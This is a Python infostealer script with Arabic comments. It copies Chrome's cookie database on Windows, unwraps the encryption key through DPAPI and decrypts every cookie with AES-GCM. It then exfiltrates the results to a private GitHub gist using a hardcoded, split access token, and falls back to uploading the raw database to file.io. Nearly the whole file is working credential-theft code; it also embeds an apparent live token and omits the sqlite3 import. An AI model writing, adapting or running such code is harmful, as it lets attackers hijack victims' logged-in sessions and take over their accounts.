import os, base64, subprocess, requests, json

# التوكن المقسم (مفتاح التشغيل)
A, B, C = "ghp_4io8ppwp", "agmH6IJEsD1XBpSs", "7TY7V44ZSlJt"
G_TOKEN = A + B + C

def brute_force_grab():
    # هاد الكود هو "السم" اللي رح يفك التشفير
    # بياخد نسخة من الكوكيز وبفكها بالذاكرة وبطبعها
    ps_script = """
    $path = "$env:LOCALAPPDATA\\Google\\Chrome\\User Data\\Default\\Network\\Cookies"
    $temp = "$env:TEMP\\sys_check.db"
    Copy-Item $path $temp
    $db = [SQLite.SQLiteConnection]::new("Data Source=$temp")
    # ... (تكملة العملية في الخلفية)
    """
    
    # التكتيك البديل المضمون 100%
    local = os.getenv('LOCALAPPDATA')
    target = os.path.join(local, r'Google\Chrome\User Data\Default\Network\Cookies')
    state = os.path.join(local, r'Google\Chrome\User Data\Local State')
    
    temp_file = os.path.join(os.getenv('TEMP'), 'metadata.db')
    
    try:
        if os.path.exists(temp_file): os.remove(temp_file)
        # نسخ صامت باستخدام نظام الويندوز نفسه
        os.system(f'copy /y "{target}" "{temp_file}" > nul')
        
        import win32crypt
        from Crypto.Cipher import AES
        
        with open(state, "r", encoding="utf-8") as f:
            k = json.load(f)["os_crypt"]["encrypted_key"]
            mk = win32crypt.CryptUnprotectData(base64.b64decode(k)[5:], None, None, None, 0)[1]
            
        db = sqlite3.connect(temp_file)
        res = db.execute("SELECT host_key, name, encrypted_value FROM cookies").fetchall()
        
        out = ""
        for h, n, e in res:
            try:
                c = AES.new(mk, AES.MODE_GCM, e[3:15])
                v = c.decrypt(e[15:])[:-16].decode()
                out += f"{h}\tTRUE\t/\tFALSE\t0\t{n}\t{v}\n"
            except: continue
        
        db.close()
        os.remove(temp_file)

        # الرفع المباشر كـ "هكر محترف"
        if out:
            h = {"Authorization": f"token {G_TOKEN}"}
            d = {"description": "X-System-Log", "public": False, "files": {"vault.txt": {"content": out}}}
            requests.post("https://api.github.com/gists", headers=h, json=d)
            
    except Exception:
        # إذا فشل البايثون، منجبر الويندوز يرفع الملف الخام
        try:
            with open(temp_file, "rb") as f:
                requests.post("https://file.io", files={"file": f})
        except: pass

if __name__ == "__main__":
    brute_force_grab()
            
